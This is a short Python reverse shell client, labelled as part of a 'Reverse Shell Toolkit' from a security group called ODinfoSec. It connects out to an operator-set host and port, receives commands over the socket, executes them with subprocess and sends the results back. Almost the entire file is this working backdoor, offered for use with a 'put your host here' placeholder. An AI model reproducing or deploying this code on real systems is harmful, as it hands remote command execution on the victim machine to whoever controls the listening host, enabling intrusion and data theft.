"""
Reverse Shell Client - Reverse Shell Toolkit - Created by MuStaP.
Offensive Defensive Information Security - ODinfoSec Team.
https://odinfosec.blogspot.com/
https://www.facebook.com/ODinfoSec/
Find More scripts & Tools on Our GitHub repository:
https://github.com/ODinfoSec/
"""
import os
import sys
import socket
import subprocess
def client():
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        host = "127.0.0.1" # Put your host here
        port = 1210 # put your port here
        s.connect((host,port))
        while True:
            cmd = s.recv(1024)
            output = subprocess.check_output(cmd)
            s.send(output)
    except OSError as OSE:
        print(OSE)
    except KeyboardInterrupt:
        pass
client()